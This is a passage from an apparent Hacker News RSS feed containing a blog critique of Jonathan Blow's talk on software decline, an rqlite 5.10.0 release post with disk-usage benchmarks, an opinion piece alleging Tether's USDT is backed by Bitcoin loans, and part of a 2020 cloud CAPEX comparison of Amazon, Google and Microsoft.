<h3>Some examples of collapsed civilizations and artefacts lost in time</h3>

<p>
I'm not a historian and will not comment on this first part of the talk. It doesn't matter much, though; my gripe is mainly with the second part.
</p>

<h3>Five nines</h3>

<p>
Blow says we used to use the "five nines" (99.999% uptime) metric when selling computer systems. Since his laptop has the habit of rebooting when in sleep mode, it can never be a candidate for 99.999% uptime. This part is true: five nines means a total yearly downtime of just above five minutes. This is presented as proof that we have lost a rhetoric of quality. This part is false.
</p>

<p>
In reality, five nines usually applies to things like emergency response switchboards (911), hospital systems, financial transaction processing, etc. It's also a metric usually accompanied by long contracts detailing various downtime scenarios that couldn't possibly count as downtime. It has never, ever been used to sell consumer laptops or the word processors we run on them.
</p>

<p>
It's also incorrect that five nines isn't used anymore: several companies, such as IBM and Amazon, sell such systems and services. Incidentally, IBM actually goes further and claims their Power9 platform can provide even higher availability. Provided, I'm sure, the network used to reach it is functioning and the client computers are working and, and, and... you get the point.
</p>

<p>
So, no, we haven't lost this rhetoric of quality. We've simply never used it the way Blow claims.
</p>

<p>
Oh, and in case anyone's wondering, my laptops never reboot unless I tell them to and one of them currently has an uptime of 55 days.
</p>

<p>
<img src="https://www.datagubbe.se/endofciv/uptime_brumbrum.png" alt="A photo of my laptop's screen, showing a 55 day uptime.">
</p>

<h3>"The industry hasn't produced robust software for decades"</h3>

<p>

What is robust? Is it my iPhone, going for weeks and months without a 
reboot? Is it
<a href="https://arstechnica.com/information-technology/2013/03/epic-uptime-achievement-can-you-beat-16-years/">the famous uptime of Novell's file and printer servers</a>, 
with documented instances running for 16 years? Is it the multi-year 
uptimes of a plethora of Unix, Windows and VMS machines? Is it the 365+ 
days (and counting) uptime of some random Linux web server I've got 
access to? Is it turnkey systems like IBM i, offering continuous 
availability?

</p>

<p>
Apparently none of the above, according to Blow.
</p>

<h3>"Tech companies are no longer about pushing tech forward"</h3>

<p>
Well, yes and no. I agree that the lifestyle app startups of Silicon Valley (and elsewhere) are hardly about pushing tech forward - but people more interested in making money rather than amazing technology has always been around. Was Infocom's umpteenth text adventure about pushing tech forward? Was any of the ten bazillion (a rough estimate) jumpy-shooty platform games produced? Was MS-DOS, single-tasking its way through 15 years of building Microsoft's empire right up until its last breath in version 6.22?
</p>

<p>
There's a lot of exciting stuff happening on the "hard tech" front. Blow does mention machine learning earlier in his talk, but "boring" things like file systems, web servers, databases and programming languages are also continually developed and improved upon. A lot of effort is also going into improving the various layers of abstraction, virtualization and containerization Blow is so adverse to - but him disliking them doesn't mean they're not about pushing tech forward.
</p>

<h3>"Abstraction leads to loss of capability."</h3>

<p>
Blow lists a number of programming languages, some of which have fallen out of fashion because of abstraction. His take basically boils down to learning assembly coding, memory management and pointers.
</p>

<p>
I agree that a large number of programmers today (myself included) are very happy with not having to deal with things like memory allocation and pointers. And yes, there are certainly horrifying examples of when abstraction gets the better of us. Plenty of web sites use a lot of completely unnecessary JavaScript framework voodoo to render a simple blog and plenty of supposed "desktop apps" are really running (very slowly) inside a bundled browser.
</p>

<p>
Despite that, I'm willing to bet a few bucks there are more people 
around today (including youngsters) who can program in C than ever 
before, and that more C and assembly code is being written than ever 
before. Linux and NetBSD, for example, are continuously being ported to 
pretty much everything that even vaguely resembles a CPU. Rust, a new 
language with a heavy focus on robustness, <b>does</b> feature pointers and 
lets the programmer manage memory. Harvard's introduction to Computer 
Science, CS50, is publicly available on Youtube and each year it 
features <a href="https://www.youtube.com/watch?v=cF6YkH-8vFk">a two hour
lecture on stuff like memory layout, pointers,
malloc() and free()</a>.
</p>

<p>
I agree that the things mentioned here are good to know about and I think anyone seriously into programming should at least try them out some time, if for no other reason than to understand why a lot of us prefer to avoid them if given the option to do so.
</p>

<p>
Oh, and garbage collection and functional programming aren't new 
abstractions. Lisp did both in the late 1950s and it's been used in a 
lot of "hardcore" settings, including
<a href="http://flownet.com/gat/jpl-lisp.html">NASA's Jet Propulsion Lab</a>.
And, unsurprisingly, a Lisp programmer will of course claim that Lisp
makes you much more productive than something with malloc() ever will.
</p>

<h3>"The productivity of Facebook employees is approaching zero"</h3>

<p>
Here we're shown some graphs of the rising number of Facebook and Twitter employees and Blow states that since Facebook doesn't really get that many new features each year, all those programmers mostly sit around and do nothing.
</p>

<p>
First of all, I'm pretty sure Facebook employs a wide range of staff who are not feature developers: lawyers, accountants, graphical 
designers, sysadmins, researchers, HR, middle management, etc. When not working on Facebook the site, employees of Facebook the company 
are also working on Instagram, WhatsApp and Oculus VR to name some of their other pursuits. I'd also argue that (measurable) individual 
output in general drops as a result of a company growing. You need to reach a certain critical mass to have a whole team working hard on 
a feature only to, by some managerial decision, drop it right before it's finished. Things like that happen all the time in large 
software companies and won't show up in Blow's rather flimsy metric.
</p>

<p>
More importantly, Blow constructs this argument around the assumption that Facebook's product is Facebook, in the sense of the social platform. This is of course wrong. Facebook doesn't have to add or change very many features on their social platform every year, they just have to keep things smooth enough for those who actually use those functions to stay content.
</p>

<p>
This is because Facebook's real product is an ad delivery platform.
</p>

<p>
As such, it collects massive amounts of personal and private data and churns it into targeted ads, all the while sucking people in with cleverly designed attention-grabbing dark patterns. I'm sure plenty of work is done on this by a whole lot of programmers, but it'll never appear as "features" to the user, only as corporate revenue. In that respect, Facebook programmers seem to be highly productive.
</p>

<h3>Ken Thompson's "Three Week Unix"</h3>

<p>
First off, I'm not out to belittle Ken Thompson's efforts here. Writing an assembler, editor and basic kernel in three weeks is highly respectable work by any standard. It's also a great piece of computer lore and fits Blow's narrative perfectly - especially with Kernighan's little quip about productivity in the end. Of course, we don't know how "robust" Thompson's software was at this stage, or how user friendly, or what kind of features it had. I'm going to boldly claim it would've been a hard sell today, even if it did run on modern hardware.
</p>

<p>
I'm also pretty sure Thompson dealt with little or nothing of the following during those three weeks: documentation, code reviews, daily standups, backlog grooming, user stories, unit tests, customer demands, A/B testing, writing commit messages and adhering to a corporate code formatting standard. We are after all talking about a guy who, when he could pick any names he wanted, opted for "creat", "mv" and "cp".
</p>

<p>
I'm also certain Thompson could work alone in a private office, rather than share an open floor plan with fifty colleagues incessantly shouting into cellphones, shuffling furniture around or having animated discussions about football two feet from his desk.
</p>

<p>
It's important to remember that apart from hardware and software, the working conditions for most developers are vastly different …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.datagubbe.se/endofciv/">https://www.datagubbe.se/endofciv/</a></em></p>]]>
            </description>
            <link>https://www.datagubbe.se/endofciv/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26061170</guid>
            <pubDate>Mon, 08 Feb 2021 05:37:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[rqlite, distributed SQLite, 5.10.0 released: comparing its disk usage to 5.6.0]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26060505">thread link</a>) | @otoolep
<br/>
February 7, 2021 | https://www.philipotoole.com/rqlite-5-10-0-released-comparing-its-disk-usage-to-5-6-0/ | <a href="https://web.archive.org/web/*/https://www.philipotoole.com/rqlite-5-10-0-released-comparing-its-disk-usage-to-5-6-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p><a href="https://github.com/rqlite/rqlite" target="_blank" rel="noopener noreferrer">rqlite</a><a href="https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0.png" target="_blank" rel="noopener noreferrer"><img src="https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-150x150.png" alt="" width="200" height="106" srcset="https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-300x159.png 300w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-1024x543.png 1024w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-768x407.png 768w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-1536x814.png 1536w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0.png 1872w" sizes="(max-width: 200px) 100vw, 200px"></a> is a lightweight, open-source, distributed relational database written in <a href="https://golang.org/" target="_blank" rel="noopener noreferrer">Go</a>, with <a href="http://sqlite.com/" target="_blank" rel="noopener noreferrer">SQLite</a> as its storage engine. <a href="https://github.com/rqlite/rqlite/releases" target="_blank" rel="noopener noreferrer">5.10.0</a> is now out, capping a <a href="https://github.com/rqlite/rqlite/blob/master/CHANGELOG.md" target="_blank" rel="noopener noreferrer">series of releases</a> that brings significant improvements in disk usage and startup times.</p>

<p>Since the release of<a href="https://github.com/rqlite/rqlite/releases/tag/v5.6.0" target="_blank" rel="noopener noreferrer"> 5.6.0</a> there are have been a number of distinct improvements, all aimed at reducing the amount of data written to disk. Why focus on disk usage? First because it’s long been obvious that disk IO is the performance bottleneck for rqlite, due to <a href="https://linux.die.net/man/2/fsync" target="_blank" rel="noopener noreferrer">fsync’ing</a> to the <a href="https://raft.github.io/" target="_blank" rel="noopener noreferrer">Raft log</a>. Secondly, rqlite aims to be a <em>lightweight</em> database, so keeping its disk footprint low is desirable. 5.10.0 now contains the following changes:</p>
<ul>
<li><a href="https://developers.google.com/protocol-buffers/docs/gotutorial" target="_blank" rel="noopener noreferrer">Protocol Buffer (Protobuf)</a> encoding of the SQL commands before they are written to the Raft log. Generally speaking protofbuf encoding is more space-efficient than JSON, which is what used in 5.6.0.</li>
<li>Compression of SQL queries (and batches of SQL queries) above a <a href="https://github.com/rqlite/rqlite/blob/v5.10.0/command/marshal.go#L14" target="_blank" rel="noopener noreferrer">certain threshold</a>, which happens before the Protobuf-encoding, and before the commands are written to the Raft log. The savings from compression are greater the larger the SQL queries sent to rqlite. This also has the nice affect of reducing network traffic from the leader node to other nodes in the cluster.</li>
<li>Compressing the copy of the SQLite database that becomes part of the <em>Raft snapshot</em>. Snapshotting is a critical step in <em>truncating</em> the Raft log, a process that ensures that the log doesn’t grow without limit. This snapshot is written to disk, for restart and recovery purposes.</li>
<li>No more use of disk for <a href="https://en.wikipedia.org/wiki/Scratch_space" target="_blank" rel="noopener noreferrer">scratch space</a>, during creation of the snapshot. Snapshot-creation now takes place entirely in memory.</li>
<li>During normal operation rqlite can use either an <a href="https://github.com/rqlite/rqlite/blob/v5.10.0/README.md#in-memory-databases" target="_blank" rel="noopener noreferrer">in-memory (the default)</a> or on-disk SQLite database. However restarting an on-disk node could previously take a long time, because applying changes from the Raft log to an on-disk database is significantly slower than writing to an in-memory database. Now 5.10.0, when running in on-disk mode, first rebuilds the SQLite in memory and only when that is complete does it move the database to disk. This means disk-based restarts are basically as fast as memory-based restarts.</li>
</ul>
<h2>Measuring the impact</h2>
<p>While it’s fairly easy to predict the impact the changes above will have, it’s always important <a href="https://www.philipotoole.com/a-prayer-for-distributed-systems-developers/">to confirm the results</a>. So I ran a simple, 6-hour load test against a single rqlite node, which used an in-memory SQLite database. The load test involved inserting a simple record into a table, over and over again. I used <a href="https://github.com/rqlite/rqlite/tree/v5.10.0/cmd/rqbench" target="_blank" rel="noopener noreferrer">rqbench</a> to perform the writes:</p>
<pre>rqbench -o 'CREATE TABLE foo (id INTEGER NOT NULL PRIMARY KEY, name TEXT)' -m 100 -n 1500000 'INSERT INTO foo(name) VALUES("fiona")'</pre>
<p>I used <a href="https://github.com/influxdata/influxdb" target="_blank" rel="noopener noreferrer">InfluxDB</a>, <a href="https://grafana.com/" target="_blank" rel="noopener noreferrer">Grafana</a>, and <a href="https://github.com/influxdata/telegraf" target="_blank" rel="noopener noreferrer">Telegraf</a> (specifically the <a href="https://github.com/influxdata/telegraf/tree/master/plugins/inputs/http" target="_blank" rel="noopener noreferrer">http</a> plugin) to collect (via the rqlite <a href="https://github.com/rqlite/rqlite/blob/master/DOC/DIAGNOSTICS.md" target="_blank" rel="noopener noreferrer">diagnostics endpoint</a>) and display the results.</p>
<p>Let’s take a look at 5.6.0 performance first (technically <a href="https://github.com/rqlite/rqlite/tree/v5.6.1" target="_blank" rel="noopener noreferrer">a patched version of 5.6.0</a> so the required metrics were collected).</p>
<p><a href="https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated.png"><img src="https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated-1024x543.png" alt="" width="474" height="251" srcset="https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated-1024x543.png 1024w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated-300x159.png 300w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated-768x407.png 768w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated-1536x814.png 1536w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated.png 1872w" sizes="(max-width: 474px) 100vw, 474px"></a></p>
<p>Nothing too out of the ordinary. The CPU is never that busy and mostly waiting for IO. The amount of data being written to disk — and rate it is being written — steadily increases however, as the SQLite snapshots grow in size. The Raft subsystem operated normally — committing log entries, and performing a snapshot every couple of minutes or so.</p>
<p>Compare the results of the same test, this time for 5.10.0.</p>
<p><a href="https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated.png"><img src="https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated-1024x543.png" alt="" width="474" height="251" srcset="https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated-1024x543.png 1024w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated-300x159.png 300w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated-768x407.png 768w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated-1536x814.png 1536w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated.png 1872w" sizes="(max-width: 474px) 100vw, 474px"></a></p>
<p>This time disk activity is significantly down, but the trade-off is more CPU activity during the snapshot-compression cycles. This is exactly the trade-off I wanted to make, but it’s good to see that it is actually happening. Note that the disk footprint is much smaller too — it’s only 30% as large for (roughly) the same amount of SQL insertions.</p>
<h2>What didn’t change?</h2>
<p>The write-performance of rqlite generally hasn’t changed that much between versions, not with these relatively small SQL statements. Mildly disappointing perhaps. However snapshotting should put much less burden on the system, meaning much less disruption to the write-performance during that periodic process. And larger SQL statements should see a much bigger write-performance improvement relative to 5.6.0, as the compression wins should also be bigger.</p>
<p>It’s also good to see that write performance remained steady throughout each test. This wasn’t something I had explicitly tested before, and didn’t receive reports of any issues, but again, it’s good to see.</p>
<p>5.10.0 adds some other small features, as well as some more diagnostics. I also expanded the test suite, as code quality is very important to me. So <a href="https://github.com/rqlite/rqlite/releases" target="_blank" rel="noopener noreferrer">download</a> it and check it out.</p>
	</div></div>]]>
            </description>
            <link>https://www.philipotoole.com/rqlite-5-10-0-released-comparing-its-disk-usage-to-5-6-0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26060505</guid>
            <pubDate>Mon, 08 Feb 2021 03:35:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Great Tether / Bitcoin Collateral Flippening]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26060435">thread link</a>) | @Clewza313
<br/>
February 7, 2021 | http://www.tr0lly.com/bitcoin/the-great-tether-bitcoin-collateral-flippening/ | <a href="https://web.archive.org/web/*/http://www.tr0lly.com/bitcoin/the-great-tether-bitcoin-collateral-flippening/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-1099">
	
	<div>
		
<p>In March 2020, unregulated crypto exchanges, led by Binance, switched to USDT as collateral for margin trading. This has led to a progressive release of around 1 million Bitcoins previously locked as collateral. The fact these newly available Bitcoins didn’t crash the price only makes sense if Tether scooped them up and is now holding them as reserves.</p>



<p>The price of Bitcoin is determined, same as for all assets, at the margin. The price is a market equilibrium between how many Bitcoins are available for trading, and how many Bitcoins are needed for daily flows:</p>



<p><strong>$BTC = Turnover / Supply</strong></p>



<p>This formula is quite straightforward: the price of Bitcoin rises with increasing use cases, and decreases with the amount of Bitcoins competing for these use cases. Note that Supply only means “Bitcoins available for trading” – all the Bitcoins sitting in HODL wallets don’t take part in the price discovery process.</p>



<h3>Bitcoin price and turnover</h3>



<p>There are three types of Bitcoin turnover:</p>



<ul><li>short term (a few days), for transfers (capital flight from China, unregulated exchange account funding, remittances)</li><li>medium term (a few months), for collateral and arbitrage (margin trading, Grayscale premium arbitrage)</li><li>long term (a few years), for HODLing</li><li></li></ul>



<p>There are also two types of one-way flows, impacting the amount of Bitcoins available:</p>



<ul><li>lost coins (reducing the Supply, positive for price)</li><li>mining rewards (increasing the Supply, negative for price)</li></ul>



<p>The first three flows compete for the Bitcoins that are available for trading at that time (“S” for Supply). For instance, if Bitcoins were only used for transfers, and people were using Bitcoin to transfer $10 billion per day, assuming an average transaction length of 1 day, the price of Bitcoin would be:</p>



<p><strong>$BTC = $10B / S</strong></p>



<p>If the Supply is 1 million Bitcoins, that would give you a $BTC market equilibrium price of $10,000. The idea is that people who use Bitcoin for real world use cases don’t care about its price, and will simply buy an amount in fiat that they need for their purpose, while the Bitcoins available for trading will compete for that fiat.</p>



<p>All things remaining equal, you have two rules:</p>



<ol><li>The lower the Supply, the higher Bitcoin’s price, and vice versa</li><li>The higher the flows, the higher Bitcoin’s price, and vice versa</li></ol>



<h3>The impact of USDT replacing Bitcoin</h3>



<p>Ever since exchanges started replacing Bitcoin by USDT for margin trading collateral, the amount of Bitcoins at exchange-controlled wallets has steadily decreased:</p>



<figure><img src="https://pbs.twimg.com/media/Ep6Hw6cXcAUYSYJ?format=jpg&amp;name=4096x4096" alt="Image"></figure>



<p>This trend has, of course, been compensated by a relentlessly increasing amount of USDT in circulation, to the tune of Bitcoin outflows multiplied by their price:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.00.02.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.00.02.png 772w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.00.02-300x138.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.00.02-768x354.png 768w" sizes="(max-width: 772px) 100vw, 772px"></figure>



<p>Unsurprisingly, most of these new USDTs sit on exchanges, Binance being on the top of the list, as they’re being used as collateral:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-06-at-20.08.37-1024x380.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-06-at-20.08.37-1024x380.png 1024w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-06-at-20.08.37-300x111.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-06-at-20.08.37-768x285.png 768w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-06-at-20.08.37.png 1136w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>This move has greatly increased the Bitcoin supply, to the tune of 1 million Bitcoins. These are Bitcoins that have been gradually released from being frozen as collateral, and are now available for other types of use.</p>



<p>The increased acceptance of USDT are also replacing Bitcoin for the transfer use case, as they aren’t volatile, and can be sent almost instantly. This has reduced Bitcoin turnover.</p>



<h3>Bitcoin to the moon… HOW?</h3>



<p>Given the rise of USDT in circulation has increased Bitcoin supply and reduced its turnover, the impact of the Tether collateral flippening on $BTC should have been disastrous. Yet, Bitcoin is up tenfold since the start of the trend. How is this possible?</p>



<p>The knee-jerk response from Bitcoiners will be that a lot of new demand for Bitcoin has emerged at the same time, citing Michael Saylor’s MicroStrategy and Grayscale. But we’re talking about 1.3 million Bitcoins (released from collateral and newly mined) in less than a year! That’s one hell of an exogenous event that should have crushed the price, right?</p>



<p>Well, no – because the event wasn’t exogenous; it was decided by the crypto community insiders – mostly Binance, Bitfinex and Tether. They knew that by releasing all this Bitcoin into the market, they would crush the price. So, they didn’t.</p>



<p>If you were to follow Tether’s own advertised rules, where new USDTs are issued only against matching USD deposits, the Tether collateral flippening should have followed this path:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.18.08.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.18.08.png 878w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.18.08-300x141.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.18.08-768x362.png 768w" sizes="(max-width: 878px) 100vw, 878px"></figure>



<p>Instead, what happened is this:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.21.34.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.21.34.png 853w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.21.34-300x69.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.21.34-768x176.png 768w" sizes="(max-width: 853px) 100vw, 853px"></figure>



<p>This path has two huge advantages:</p>



<ul><li>no fiat is needed</li><li>no Bitcoins are released into Supply</li></ul>



<p>It also has one small disadvantage:</p>



<ul><li>Tether has to lie about how USDTs are issued and what its reserves are made of</li></ul>



<p>Note that this disadvantage can be easily solved by round-tripping, a practice that was once dear to Wirecard, where a very small amount of fiat circulates a lot of times between everyone involved, to make it look like there are transactions. Meaning that Binance doesn’t send Bitcoins in exchange of USDT directly to Tether. They first put these Bitcoins as collateral for a loan from Tether, then wire the proceeds of the loan to Tether, and get USDTs in return. Exactly the same result as buying Bitcoin with USDT, but very different appearances and paper trail.</p>



<h3>USDTs are backed by Bitcoin</h3>



<p>More accurately, Tether’s reserves are loans to exchanges, collateralized by Bitcoin. The Bitcoins that were used as collateral for margin trading, are now used as collateral for USDT. This way, exchanges know that USDTs are actually worth something, and accept to maintain the 1:1 peg. And no fiat needs to be deposited at Tether, a small and shady company with no offices, under investigation by the NYAG, with a shaky banking relationship with Deltec that’s not even a real bank.</p>



<p>This is the only way the Tether collateral flippening wouldn’t have crushed Bitcoin’s price. The question that remains to be answered is, if exchanges accept that Tether issues USDTs backed by Bitcoin, why not print some USDT out of thin air to buy Bitcoin with it, and pump $BTC in an effort to ignite another round of FOMO?</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

			
</article><!-- #post-${ID} -->

	<nav role="navigation">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>http://www.tr0lly.com/bitcoin/the-great-tether-bitcoin-collateral-flippening/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26060435</guid>
            <pubDate>Mon, 08 Feb 2021 03:24:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Follow the CAPEX: Cloud giants Amazon, Microsoft, and Google 2020 comparison]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26060329">thread link</a>) | @fireball_blaze
<br/>
February 7, 2021 | https://www.platformonomics.com/2021/02/follow-the-capex-cloud-table-stakes-2020-retrospective/ | <a href="https://web.archive.org/web/*/https://www.platformonomics.com/2021/02/follow-the-capex-cloud-table-stakes-2020-retrospective/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2892">
	<!-- .entry-header -->

	<div>
		
<p>It is time for our annual bulletin to <a href="https://www.platformonomics.com/tag/capex/">CAPEX obsessives</a> (previous updates from <a href="https://www.platformonomics.com/www.platformonomics.com/2017/04/follow-the-capex-cloud-table-stakes/">2016</a>, <a href="https://www.platformonomics.com/2018/04/follow-the-capex-cloud-table-stakes-2017-edition/">2017</a>, <a href="https://www.platformonomics.com/2019/02/follow-the-capex-cloud-table-stakes-2018-edition/">2018</a>, <a href="https://www.platformonomics.com/2020/02/follow-the-capex-cloud-table-stakes-2019-edition/">2019</a> as well as <a href="https://www.platformonomics.com/tag/capex/">earlier</a> installments). The hashtag for CAPEX 2020 is “#bonkers”.</p>



<p><strong>The three hypercloud companies – Amazon, Google, and Microsoft – collectively spent almost $97 billion on CAPEX in 2020</strong>, up 32% from 2019’s $73.5 billion. Amazon and Microsoft’s spending again hit new highs (bonkers new highs in Amazon’s case) while Google’s spending declined for the second year in a row. <strong>Amazon spent more on CAPEX than <u>any </u>company (not just cloud companies) in 2020 </strong><a href="#*" data-type="internal" data-id="#*">[*]</a><strong>.</strong></p>



<p>Standard caveat: The reported numbers are the companies’ total CAPEX spend, not just cloud infrastructure, so includes land, office buildings, <a href="https://www.geekwire.com/2020/emptied-pandemic-overtaken-cranes-microsoft-hq-symbol-changing-world/">campus redevelopments</a>, warehouses, <a href="https://www.geekwire.com/2021/amazon-adds-palm-reading-biometric-id-scanner-physical-retail-stores-seattle/">panopticonvenience stores</a>, manufacturing tooling, self-driving cars, delivery trucks, flying machines, <a href="https://www.geekwire.com/2020/amazons-project-kuiper-drops-hints-customer-terminals-satellite-internet/">satellite constellations</a>, hardware that both is and is not required for quantum computing, and – the dream is admittedly on life support – a Google space elevator. The numbers include finance leases for both Amazon and Microsoft, as well as build-to-suit leases for Amazon (these are debt instruments used to finance specific CAPEX expenditures, namely servers and buildings).</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-5.png"><img loading="lazy" width="868" height="504" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-5.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-5.png 868w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-5-300x174.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-5-768x446.png 768w" sizes="(max-width: 868px) 100vw, 868px"></a></figure>



<p><strong>In 2020, Amazon’s CAPEX was up a mere 69% to just shy of an absolutely bonkers $54 billion, Google’s spend declined over 5% to $22.3 billion and Microsoft’s increased 14% to $20.6 billion. </strong>Amazon (company slogan: “a penny of free cash flow is a terrible thing to waste on abstract accounting constructs like profits”) is accelerating its spending and may soon achieve orbital escape velocity on the back of its CAPEX trajectory, rendering Jeff Bezos’ personal space program unnecessary.</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-6.png"><img loading="lazy" width="940" height="572" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-6.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-6.png 940w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-6-300x183.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-6-768x467.png 768w" sizes="(max-width: 940px) 100vw, 940px"></a></figure>



<p>It is beyond bonkers that <a href="https://arstechnica.com/information-technology/2013/03/vmware-targets-rival-bookseller-amazon-with-its-own-public-cloud/">“a company that sells books”</a> spends more on CAPEX than any other company <a href="#*" data-type="internal" data-id="#*">[*]</a>. And the idea that our other two “software companies” have a CAPEX spend in the same league or beyond the biggest automakers, energy companies, semiconductor manufacturers, and telcos in the world is likewise bonkers.</p>



<p><a name="*">[*]</a> Where “any other company” is defined as the random set I looked up and charted above. Are there other big spenders I’ve missed? I didn’t look at Chinese companies, mostly because I’m lazy, but also because often their investments are non-economic, accounting dodgy, and audits optional, even for companies listed in the US (if only domestic companies had that luxury, but Wall Street still dreams of selling a collaterized debt obligation to each and every person in China).</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-7.png"><img loading="lazy" width="854" height="504" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-7.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-7.png 854w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-7-300x177.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-7-768x453.png 768w" sizes="(max-width: 854px) 100vw, 854px"></a></figure>



<p><strong>The three hyperclouds’ cumulative CAPEX spend since 2000 is almost $444 billion</strong>, with over $170 billion of that occurring in the last two years. Efforts to find an amusing comparable failed.</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-8.png"><img loading="lazy" width="856" height="506" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-8.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-8.png 856w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-8-300x177.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-8-768x454.png 768w" sizes="(max-width: 856px) 100vw, 856px"></a></figure>



<p>As a percentage of revenue, hypercloud CAPEX is clustered between 12 and 14% of revenue, with Amazon edging out Microsoft for the top spot this year.</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-14.png"><img loading="lazy" width="724" height="436" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-14.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-14.png 724w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-14-300x181.png 300w" sizes="(max-width: 724px) 100vw, 724px"></a></figure>



<p>Azure and Google Cloud (which includes both Google Cloud Platform and whatever they are calling Google Docs this week) have both seen growth accelerate slightly since “<a href="https://www.platformonomics.com/2020/03/the-geopolitical-game-board-march-2020/">a bat out of Wuhan</a>” became the new “butterfly effect”. The AWS growth rate is lower, but they grew revenue by over $10 billion in 2020, so their dollar growth alone is bigger than GCP.</p>



<h2><strong>Amazon #bonkers</strong></h2>



